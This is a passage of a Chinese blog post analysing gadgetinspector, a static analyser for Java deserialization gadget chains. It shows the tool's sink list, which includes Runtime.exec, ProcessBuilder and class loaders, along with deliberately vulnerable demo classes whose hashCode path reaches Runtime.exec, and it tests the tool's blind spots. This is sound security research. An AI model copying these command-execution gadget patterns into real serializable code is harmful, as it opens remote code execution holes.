class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileInputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileOutputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; (method.getName().equals(<span class="string">"newInputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newOutputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedReader"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedWriter"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("forName")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("getMethod")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we</span></span><br><span class="line">        <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">        <span class="comment">// method is being invoked, we don't mark that as interesting.</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/reflect/Method"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invoke"</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URLClassLoader"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newInstance"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/System"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Shutdown"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newOutputStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/ProcessBuilder"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/ClassLoader"</span>))</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URL"</span>) &amp;&amp; method.getName().equals(<span class="string">"openStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"org/codehaus/groovy/runtime/InvokerHelper"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invokeMethod"</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/MetaClass"</span>))</span><br><span class="line">                &amp;&amp; Arrays.asList(<span class="string">"invokeMethod"</span>, <span class="string">"invokeConstructor"</span>, <span class="string">"invokeStaticMethod"</span>).contains(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，这样减少了运行开销，避免了环路，但是丢掉了很多其他链。</p><p>这个过程看起来就像下面这样：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/24.png" alt=""></p><p>通过污点的传递，最终找到从source-&gt;sink的利用链</p><p><strong>注</strong>：targ表示污染参数的index，0-&gt;1这样的表示父方法的0参传递给了子方法的1参</p><h3 id="样例分析"><a href="#样例分析" class="headerlink" title="样例分析"></a>样例分析</h3><p>现在根据作者的样例写个具体的demo实例来测试下上面这些步骤。</p><p>demo如下:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/25.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">IFn.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IFn</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec((String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnConstant.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnConstant</span> <span class="keyword">implements</span> <span class="title">IFn</span> , <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Object value;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnConstant</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnCompose.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnCompose</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IFn f1, f2;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnCompose</span><span class="params">(IFn f1, IFn f2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.f1 = f1;</span><br><span class="line">            <span class="keyword">this</span>.f2 = f2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> f2.invokeCall(f1.invokeCall(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">TestDemo.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDemo</span> </span>&#123;</span><br><span class="line">        <span class="comment">//测试拓扑排序的正确性</span></span><br><span class="line">        <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">pMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">            String vul = cMethod(arg);</span><br><span class="line">            <span class="keyword">return</span> vul;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">cMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> arg.toUpperCase();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">AbstractTableModel.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.model;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> com.demo.ifn.IFn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line">    <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractTableModel</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> HashMap&lt;String, IFn&gt; __clojureFnMap;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">AbstractTableModel</span><span class="params">(HashMap&lt;String, IFn&gt; clojureFnMap)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.__clojureFnMap = clojureFnMap;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            IFn f = __clojureFnMap.get(<span class="string">"hashCode"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                f.invokeCall(<span class="keyword">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.__clojureFnMap.hashCode() + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：下面截图中数据的顺序做了调换，同时数据也只给出com/demo中的数据</p><h4 id="Step1-枚举全部类及每个类所有方法"><a href="#Step1-枚举全部类及每个类所有方法" class="headerlink" title="Step1 枚举全部类及每个类所有方法"></a>Step1 枚举全部类及每个类所有方法</h4><p>classes.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/26.png" alt=""></p><p>methods.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/27.png" alt=""></p><h4 id="Step2-生成passthrough数据流-1"><a href="#Step2-生成passthrough数据流-1" class="headerlink" title="Step2 生成passthrough数据流"></a>Step2 生成passthrough数据流</h4><p>passthrough.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/28.png" alt=""></p><p>可以看到IFn的子类中只有FnConstant的invokeCall在passthrough数据流中，因为其他几个在静态分析中无法判断返回值与参数的关系。同时TestDemo的cMethod与pMethod都在passthrough数据流中，这也说明了拓扑排序那一步的必要性和正确性。</p><h4 id="Step3-枚举passthrough调用图-1"><a href="#Step3-枚举passthrough调用图-1" class="headerlink" title="Step3 枚举passthrough调用图"></a>Step3 枚举passthrough调用图</h4><p>callgraph.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/29.png" alt=""></p><h4 id="Step4-搜索可用的source-1"><a href="#Step4-搜索可用的source-1" class="headerlink" title="Step4 搜索可用的source"></a>Step4 搜索可用的source</h4><p>sources.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/30.png" alt=""></p><h4 id="Step5-搜索生成调用链-1"><a href="#Step5-搜索生成调用链-1" class="headerlink" title="Step5 搜索生成调用链"></a>Step5 搜索生成调用链</h4><p>在gadget-chains.txt中找到了如下链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com/demo/model/AbstractTableModel.hashCode()I (0)</span><br><span class="line">  com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (1)</span><br><span class="line">  java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1)</span><br></pre></td></tr></table></figure><p>可以看到选择的确实是找了一条最短的路径，并没有经过FnCompose、FnConstant路径。</p><h5 id="环路造成路径爆炸"><a href="#环路造成路径爆炸" class="headerlink" title="环路造成路径爆炸"></a>环路造成路径爆炸</h5><p>上面流程分析第五步中说到，如果去掉已访问过节点的判断会怎么样呢，能不能生成经过FnCompose、FnConstant的调用链呢？</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/31.png" alt=""></p><p>陷入了爆炸状态，Search space无限增加，其中必定存在环路。作者使用的策略是访问过的节点就不再访问了，这样解决的环路问题，但是丢失了其他链。</p><p>比如上面的FnCompose类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fncompose</span> <span class="keyword">implements</span> <span class="title">IFn</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IFn f1,f2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> f2.invoke(f1.invoke(arg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于IFn是接口，所以在调用链生成中会查找是它的子类，假如f1,f2都是FnCompose类的对象，这样形成了环路。</p><h5 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h5><p>测试隐式调用看工具能否发现，将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"FnEval&#123;&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.cmd = (String) arg;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span> + <span class="string">" test"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com/demo/model/AbstractTableModel.hashCode()I (0)</span><br><span class="line">  com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (0)</span><br><span class="line">  java/lang/StringBuilder.append(Ljava/lang/Object;)Ljava/lang/StringBuilder; (1)</span><br><span class="line">  java/lang/String.valueOf(Ljava/lang/Object;)Ljava/lang/String; (0)</span><br><span class="line">  com/demo/ifn/FnEval.toString()Ljava/lang/String; (0)</span><br><span class="line">  java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1)</span><br></pre></td></tr></table></figure><p>隐式调用了tostring方法，说明在字节码分析中做了查找隐式调用这一步。</p><h5 id="不遵循反射调用"><a href="#不遵循反射调用" class="headerlink" title="不遵循反射调用"></a>不遵循反射调用</h5><p>在github的工具说明中，作者也说到了在静态分析中这个工具的盲点，像下面这中<code>FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>写法是不遵循反射调用的，将FnEval.java修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> FnEval.class.getMethod(<span class="string">"exec"</span>, String.class).invoke(<span class="keyword">null</span>, arg);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，确实没有发现。但是将<code>FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>改为<code>this.getClass().getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>这种写法却是可以发现的。</p><h5 id="特殊语法"><a href="#特殊语法" class="headerlink" title="特殊语法"></a>特殊语法</h5><p>测试一下比较特殊的语法呢，比如lambda语法？将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">interface</span> <span class="title">ExecCmd</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            ExecCmd execCmd = cmd -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> execCmd.exec((String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对特殊语法分析。</p><h5 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h5><p>测试匿名内部类，将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 